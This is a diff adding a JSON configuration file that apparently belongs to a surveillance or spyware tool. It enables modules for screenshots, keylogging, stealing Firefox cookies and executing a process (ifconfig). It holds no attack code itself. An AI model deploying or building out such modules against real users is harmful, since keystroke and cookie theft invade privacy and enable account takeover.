@@ -1,0 +1,21 @@
+{
+    "modules" : {
+            "screenshoter" : 
+            {
+                "number_of_shots": 10    
+            },
+            "keylogger" : 
+            {
+                  
+            },
+            "cookie_stealer" : 
+            {
+                "browser": "Firefox"    
+            },
+            "proc_executor" : 
+            {
+                "proc_path": "/usr/sbin/ifconfig"    
+            }
+        }
+    
+}
